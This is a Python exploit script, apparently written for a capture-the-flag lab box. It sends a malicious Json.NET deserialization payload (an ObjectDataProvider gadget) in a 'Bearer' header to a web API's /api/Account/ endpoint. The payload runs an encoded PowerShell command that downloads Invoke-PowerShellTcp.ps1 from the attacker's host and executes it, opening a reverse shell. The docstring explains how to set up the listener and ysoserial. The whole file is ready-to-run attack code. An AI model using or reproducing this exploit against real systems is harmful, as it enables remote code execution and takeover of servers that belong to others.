import argparse
import requests
from urllib.parse import urljoin
import traceback
from hashlib import sha1
import json
from base64 import b64encode

def generatePayload(lhost):
    """
    IMPORTANT NOTES:
    [+] To get a reverse shell, you must have a python server running on port 8000 hosting your powershell reverse shell (Invoke-PowerShellTcp.ps1),
    (e.g, https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1)
    [+] Edit the reverse shell script to customize the listining host & port
    [+] ysoserail command used: `ysoserial.exe --gadget=ObjectDataProvider --formatter=Json.NET --command="<YOUR_COMMAND_HERE>"`
    """
    print("[*] Generating the payload ...")
    payload = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}:8000/Invoke-PowerShellTcp.ps1')"
    b64encodedPayload = b64encode(payload.encode('utf-16le')).decode('utf-8')
    object = {
        '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
        'MethodName': 'Start',
        'MethodParameters': {
            '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            '$values': ['cmd', f'/c powershell -EncodedCommand {b64encodedPayload}']
        },
        'ObjectInstance': {
            '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
        }
    }

    json_object = json.dumps(object)
    encoded = b64encode(json_object.encode('utf-8')).decode('utf-8')  # decode to get a str instead of bytes
    print("[+] Payload: ", encoded)
    return encoded


def sendPayload(target, lhost):
    url = urljoin(target, "/api/Account/")
    headers = {
        "Bearer": generatePayload(lhost)
    }
    try:
        print("[*] Sending the request...")
        requests.get(url, headers=headers)
        print("[+] Request sent. Check your listener.")
    except Exception as e:
        print("[-] An error occured sending the request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser("Get an RCE via sending malicious .NET serialized object")
    parser.add_argument("target", help="Target IP or URL (e.g, http://10.10.10.158)")
    parser.add_argument("lhost", help="Listener IP address")
    args = parser.parse_args()
    sendPayload(args.target, args.lhost)


if __name__ == "__main__":
    main()
